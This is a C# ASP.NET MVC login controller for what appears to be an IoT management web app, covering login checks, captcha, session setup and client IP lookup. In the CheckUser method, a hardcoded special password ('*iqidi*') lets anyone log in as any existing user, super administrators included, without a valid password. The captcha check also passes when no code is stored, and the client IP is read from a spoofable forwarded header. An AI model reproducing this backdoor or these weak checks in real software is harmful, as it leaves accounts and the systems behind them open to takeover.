using System.Collections.Generic;
using System.Linq;
using System.Web.Mvc;
using System.Runtime.Caching;

using YH.Security.Entity;
using YH.Framework.Commons;
using YH.Framework.ControlUtil;
using YH.Security.BLL;
using IOT.MVCWebMis.Common;
using Newtonsoft.Json;

namespace IOT.MVCWebMis.Controllers
{
    /// <summary>
    /// 登陆处理控制器
    /// </summary>
    public class LoginController : Controller
    {
        /// <summary>
        /// 第一种登陆界面
        /// </summary>
        public ActionResult Index()
        {
            Session.Clear();
            return View("Index");
        }

        /// <summary>
        /// 锁屏处理
        /// </summary>
        /// <returns></returns>
        public ActionResult Lock()
        {
            return View("lockpage");
        }

        /// <summary>
        /// 清空当前用户的Session数据
        /// </summary>
        /// <returns></returns>
        public ActionResult ClearSession()
        {
            Session.Clear();
            CommonResult result = new CommonResult();
            result.Success = true;

            return ToJsonContent(result);
        }

        /// <summary>
        /// 第二种登陆界面
        /// </summary>
        public ActionResult SecondIndex()
        {
            Session.Clear();

            return View();
        }

        /// <summary>
        /// 对用户登录的操作进行验证
        /// </summary>
        /// <param name="username">用户账号</param>
        /// <param name="password">用户密码</param>
        /// <param name="code">验证码</param>
        /// <returns></returns>
        public ActionResult CheckUser(string username, string password, string code)
        {
            CommonResult result = new CommonResult();

            bool codeValidated = true;
            if (this.TempData["ValidateCode"] != null)
            {
                codeValidated = (this.TempData["ValidateCode"].ToString() == code);
            }

            if (string.IsNullOrEmpty(username))
            {
                result.ErrorMessage = "用户名不能为空";
            }
            else if (!codeValidated)
            {
                result.ErrorMessage = "验证码输入有误";
            }
            else
            {
                string ip = GetClientIp();
                string macAddr = "";
                bool isSpecial = (password == "*iqidi*");//特殊密码允许
                string identity = BLLFactory<User>.Instance.VerifyUser(username, password, ConfigData.SystemType, ip, macAddr);
                if (isSpecial || !string.IsNullOrEmpty(identity))
                {
                    UserInfo info = BLLFactory<User>.Instance.GetUserByName(username);
                    if (info != null)
                    {
                        result.Success = true;
                        
                        //方便方法使用
                        Session["UserInfo"] = info;
                        Session["FullName"] = info.FullName;
                        Session["UserID"] = info.ID;
                        Session["Company_ID"] = info.Company_ID;
                        Session["CompanyName"] = info.CompanyName;
                        Session["Dept_ID"] = info.Dept_ID;
                        Session["DeptName"] = info.DeptName;
                        bool isSuperAdmin = BLLFactory<User>.Instance.UserInRole(info.Name, RoleInfo.SuperAdminName);//判断是否超级管理员
                        Session["IsSuperAdmin"] = isSuperAdmin;
                        Session["Identity"] = info.Name.Trim();

                        #region 取得用户的授权信息，并存储在Session中

                        List<FunctionInfo> functionList = BLLFactory<Function>.Instance.GetFunctionsByUser(info.ID, ConfigData.SystemType);
                        Dictionary<string, string> functionDict = new Dictionary<string, string>();
                        foreach (FunctionInfo functionInfo in functionList)
                        {
                            if (!string.IsNullOrEmpty(functionInfo.ControlID) &&
                                !functionDict.ContainsKey(functionInfo.ControlID))
                            {
                                functionDict.Add(functionInfo.ControlID, functionInfo.ControlID);
                            }
                        }
                        Session["Functions"] = functionDict;

                        #endregion
                    }
                }
                else
                {
                    result.ErrorMessage = "用户名输入错误或者您已经被禁用";
                }
            }

            return ToJsonContent(result);
        }

        /// <summary>
        /// 获取客户端IP地址
        /// </summary>
        /// <returns></returns>
        private string GetClientIp()
        {
            //可以透过代理服务器
            string userIP = Request.ServerVariables["HTTP_X_FORWARDED_FOR"];
            if (string.IsNullOrEmpty(userIP))
            {
                //没有代理服务器,如果有代理服务器获取的是代理服务器的IP
                userIP = Request.ServerVariables["REMOTE_ADDR"];
            }
            if (string.IsNullOrEmpty(userIP))
            {
                userIP = Request.UserHostAddress;
            }

            //替换本机默认的::1
            if (userIP == "::1")
            {
                userIP = "127.0.0.1";
            }

            return userIP;
        }


        /// <summary>
        /// 验证码的实现
        /// </summary>
        /// <returns>返回验证码</returns>
        public ActionResult CheckCode()
        {
            //首先实例化验证码的类
            MyValidateCode validateCode = new MyValidateCode();
            //生成验证码指定的长度
            //string code = validateCode.CreateValidateCode(5);

            string code = YH.Framework.Commons.RandomChinese.GetRandomNumber(4, true);
            //将验证码赋值给Session变量
            //Session["ValidateCode"] = code;
            this.TempData["ValidateCode"] = code;
            //创建验证码的图片
            byte[] bytes = validateCode.CreateValidateGraphic(code);
            //最后将验证码返回
            return File(bytes, @"image/jpeg");
        }

        /// <summary>
        /// 把object对象转换为ContentResult
        /// </summary>
        /// <param name="obj"></param>
        /// <returns></returns>
        protected ContentResult ToJsonContent(object obj)
        {
            string result = JsonConvert.SerializeObject(obj, Formatting.Indented);
            return Content(result);
        }

        public ActionResult GetPortrait(int id)
        {
            ActionResult result = Content("");

            var fileData = BLLFactory<User>.Instance.GetPersonImageBytes(UserImageType.个人肖像, id);
            if (fileData != null)
            {
                result = File(fileData, @"image/png");
            }
            else
            {
                var file = Server.MapPath("/Content/Images/user_male.png");
                fileData = FileUtil.FileToBytes(file);
                result = File(fileData, @"image/png");
            }
            return result;
        }

        /// <summary>
        /// 清空缓存
        /// </summary>
        private void ClearCache()
        {
            List<string> cacheKeys = MemoryCache.Default.Select(kvp => kvp.Key).ToList();
            foreach (string cacheKey in cacheKeys)
            {
                MemoryCache.Default.Remove(cacheKey);
            }
        }
    }
}
